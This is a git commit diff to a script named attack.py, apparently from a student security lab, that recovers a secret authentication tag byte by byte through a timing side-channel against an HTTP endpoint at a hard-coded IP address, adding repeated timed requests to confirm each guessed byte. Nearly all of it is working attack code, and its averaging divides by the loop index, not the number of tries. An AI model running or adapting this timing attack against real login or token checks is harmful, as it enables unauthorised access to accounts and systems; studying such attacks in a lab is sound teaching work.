90054ca1a5731791c2b7d1ad23aa74636058cd75
zamplyy <jojar_kga@hotmail.com>
2018-10-09 12:59:56 +0200

    now jumps back if time is to low

--- attack.py
+++ attack.py
@@ -12,16 +12,26 @@ def testTag(tag):
     print("The Time :" + str(result) + " for tag : " + tag)
     return result
 
-delay = "999"
-delayInt = 0.999
+def testTagTimes(tag, numberOfTries):
+    totUrl = url + tag
+    result = 0
+    for x in range(numberOfTries):
+        result += requests.get(totUrl).elapsed.total_seconds()
+
+    result = result / x
+    print("The Average Time :" + str(result) + " for tag : " + tag)
+    return result
+
+delay = "100"
+delayInt = 0.100
 user = "joarkarl100"
 url = "http://130.243.27.198/auth/" + delay + "/" + user + "/"
-
+averageCheckNumber = 60
 
 tags = ["00" for x in range(16)]
 
-
-for x in range(16):
+x = 0
+while x < 16:
     found = 0
     for i in range(0,16):
         for j in range(0,16):
@@ -31,10 +41,15 @@ for x in range(16):
                 thisTime = testTag(buildTag(tags))
 
                 if thisTime > (delayInt * (x + 1)):
-                    #Testa igen för att säkertställa att den är rätt
+                    #Calculate the time again to make sure it is right
+                    thisTime = testTagTimes(buildTag(tags), averageCheckNumber)
+                    if thisTime > (delayInt * (x + 1)):
+                        print ("Found " + partOfTag + " as index " + str(x) + " of tag")
+                        found = 1
 
-                    print ("Found " + partOfTag + " as index " + str(x) + " of tag")
-                    found = 1
+                if (thisTime < (delayInt * (x))) & (x > 0):
+                    x = x - 1
+    x = x + 1
 
 print("    ")        
 print(buildTag(tags))
